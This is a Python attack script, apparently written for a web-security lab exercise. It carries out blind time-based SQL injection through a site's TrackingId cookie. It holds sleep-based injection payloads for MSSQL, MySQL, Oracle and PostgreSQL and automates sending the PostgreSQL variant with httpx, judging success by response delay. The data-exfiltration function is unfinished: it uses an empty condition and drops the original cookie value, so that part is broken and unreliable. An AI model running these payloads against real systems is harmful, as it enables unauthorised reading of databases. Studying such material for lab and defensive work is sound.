import httpx
import time
from dataclasses import dataclass
from urllib.parse import quote

@dataclass
class Payload:
    MSSQL: list[str]
    MySQL: list[str]
    Oracle: list[str]
    PostgreSQL: list[str]



blind_time_based_payloads = Payload(
    MSSQL=["'; IF (1=1) WAITFOR DELAY '0:0:10'--", "'||WAITFOR DELAY '0:0:10'--"],
    MySQL=["'; IF (1=1) SELECT SLEEP(10)#", "'; IF (1=1) SELECT SLEEP(10)-- ", "'||SLEEP(10)#", "'||SLEEP(10)-- "],
    Oracle=["'; IF (1=1) dbms_pipe.receive_message(('a'),10)--", "'||dbms_pipe.receive_message(('a'),10)--"],
    PostgreSQL=["';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--", "'||pg_sleep(10)"])



def blind_time_based(url):
    #
    # Blind time-based SQLi
    #

    sleep = 10
    case = "1=1"
    payload = f"';SELECT CASE WHEN ({case}) THEN pg_sleep({sleep}) ELSE pg_sleep(0) END--"
    payload_encoded = quote(payload)
    print(f"Target URL: {url}")
    print(f"Sleep: {sleep}")
    print(f"Payload raw: {payload}")
    print(f"Payload URl encoded: {payload_encoded}")

    start = time.time()
    r = httpx.get(url)
    end = time.time()
    timing_offset = int(end - start)
    print(f"Timing offset: {timing_offset}")

    print(f"Initial time: {end - start} seconds")

    injection = r.cookies["TrackingId"] + payload_encoded
    cookies = httpx.Cookies({"TrackingId": injection, "session": r.cookies["session"]})

    start = time.time()
    r = httpx.get(url, cookies=cookies, timeout=None)
    end = time.time()
    duration = int(end - start)

    print(f"Injection time: {duration} seconds")
    print(f"Status: {r.status_code}")

    if duration > sleep:
        print(f"Injection successful")
    else:
        print(f"Injection failed")

def blind_time_based_with_exfil(url):
    #
    # Blind time-based SQLi with data exfil
    #

    payloads = Payload(
        MSSQL=["'; IF (1=1) WAITFOR DELAY '0:0:10'--", "'||WAITFOR DELAY '0:0:10'--"],
        MySQL=["'; IF (1=1) SELECT SLEEP(10)#", "'; IF (1=1) SELECT SLEEP(10)-- ", "'||SLEEP(10)#", "'||SLEEP(10)-- "],
        Oracle=["'; IF (1=1) dbms_pipe.receive_message(('a'),10)--", "'||dbms_pipe.receive_message(('a'),10)--"],
        PostgreSQL=["';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--", "'||pg_sleep(10)"])

    sleep = 10
    case = "1=1"
    payload = f"';SELECT CASE WHEN ({case}) THEN pg_sleep({sleep}) ELSE pg_sleep(0) END--"
    payload_encoded = quote(payload)
    print(f"Target URL: {url}")
    print(f"Sleep: {sleep}")
    print(f"Payload raw: {payload}")
    print(f"Payload URl encoded: {payload_encoded}")

    start = time.time()
    r = httpx.get(url)
    end = time.time()
    timing_offset = int(end - start)
    print(f"Timing offset: {timing_offset}")

    print(f"Initial time: {end - start} seconds")

    injection = r.cookies["TrackingId"] + payload_encoded
    cookies = httpx.Cookies({"TrackingId": injection, "session": r.cookies["session"]})

    start = time.time()
    r = httpx.get(url, cookies=cookies, timeout=None)
    end = time.time()
    duration = int(end - start)

    print(f"Injection time: {duration} seconds")
    print(f"Status: {r.status_code}")

    if duration > sleep:
        print(f"Injection successful")

        case = ""
        payload = f"';SELECT CASE WHEN ({case}) THEN pg_sleep(10) ELSE pg_sleep(0) END--"
        payload_encoded = quote(payload)
        cookies["TrackingId"] = payload_encoded
        start = time.time()
        r = httpx.get(url, cookies=cookies, timeout=None)
        end = time.time()
        duration = int(end - start)
    else:
        print(f"Injection failed")